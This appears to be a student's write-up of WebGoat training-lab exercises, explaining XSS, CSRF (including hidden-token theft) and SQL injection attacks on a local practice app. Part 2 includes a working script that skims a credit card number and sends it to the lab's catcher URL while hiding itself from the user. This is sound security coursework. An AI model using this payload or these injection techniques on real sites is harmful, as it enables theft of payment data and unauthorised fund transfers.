# Web-Security-Attack

## Part 1:
The search bar is exploitable since the server displays the input to the webpage without properly checking the input. The attacker can then type javascript/HTML as input which will be displayed and run under the origin of the website. So my input consists of a close tag to close the website's open tag, HTML to construct a form, and javascript to steal the username and password.


## Part 2:
The digital access code is exploitable since the server displays the error message along with the input when the input does not make sense, without properly checking/sanitizing the input. The attacker can then type javascript/HTML as input which will be displayed and run under the origin of the website. In addition, the submit button does not check the input so when the user clicks on "Purchase", the malicious code also gets to run. So I prepared javascript to steal the credit card information and delete error messages that the website may display. Furthermore, I put the original access code "111" and lots of white spaces in front of my javascript to hide the javascript from the user. I then encode my javascript and the white spaces and put them in an argument of my crafted URL. Below is the unencoded URL: http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=111
```                                               
<script>
	(function hack() {
		var creditCardNumber = encodeURI(document.getElementsByName('field2')[0].value);
		var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&card=" + creditCardNumber;
		var XSSImage = new Image();
		XSSImage.src = url;
		var message = document.getElementById('message');
		while (message.firstChild) {
			message.removeChild(message.firstChild);
		}
	})();
</script>
```

## Part 3:
The exploitable field is the message field, because the receiver can click on the title and loads the message which is not properly checked/sanitized by the server. Attacker can then type javascript/HTML as message which will be displayed and run under the origin of the website. In this question, the user happens to be authenticated, so I prepared the message as an html image tag which makes, via its src attribute, a GET request to the "bank" to transfer some money.

## Part 4:
The exploitable field is still the message field. The situation is similar to part 3 where the server does not properly check/sanitize the message and clicking on the title loads the message that may be malicious. The difference here is that the "bank" expects a "CONFIRM" request too. So the attacker just needs to "manually" confirm the transaction using javascript/HTML in the message field. So I prepared an iframe that makes, via its src attribute, a GET request to the "bank" to transfer funds. When my javascript/HTML gets loaded, it calls a function to send a hardcoded "CONFIRM" string to the "bank" so the transaction can be completed.

## Part 5:
The exploitable field is still the message field. The situation is similar to part 4 where the server does not properly check/sanitize the message and clicking on the title loads the message that may be malicious. The difference here is the "bank" expects a token instead of a "CONFIRM" string. The transaction can be completed since the token is already actually on the webpage of the "bank" except it is hidden. So I prepared an iframe that makes, via its src attribute, a GET request to the "bank" to transfer funds, and when the submit page from the "bank" loads, I will have access to the hidden token. The iframe calls a javascript function to get that token and sends the transfer fund request again with the token.

## Part 6:
The SQL input box is exploitable since the server does not sanitize the SQL input. So I just close the WHERE condition with ' and add another OR condition which always evaluates to true.

## Part 7:
The SQL input box is exploitable since the server does not sanitize the SQL input. The server will execute more than one SQL query, so I just uses ; to end the first query and put the two evil queries after the ; for part 1 and part 2 respectively.

## Part 8:
The SQL input box is exploitable since the server does not sanitize the SQL input. So I just add an extra condition to the WHERE clause. The extra condition is an AND whose value comes from a subquery that guess the range of PIN. My initial guess was less than 10000 which turned out to be true. Then I did a binary search as follows:
```
1st try: 10000 -> valid 
2nd try: 5000 -> valid 
3rd try: 2500 -> valid 
4th try: 1250 -> invalid 
5th try: 1875 -> invalid 
6th try: 2188 -> invalid 
7th try: 2344 -> invalid 
8th try: 2422 -> valid 
9th try: 2383 -> valid 
10th try: 2364 -> invalid 
11th try: 2374 -> valid 
12th try: 2369 -> valid 
13th try: 2367 -> valid 
14th try: 2365 -> valid (answer is 2364)
```
Finally I arrived at the correct PIN which is 2364.
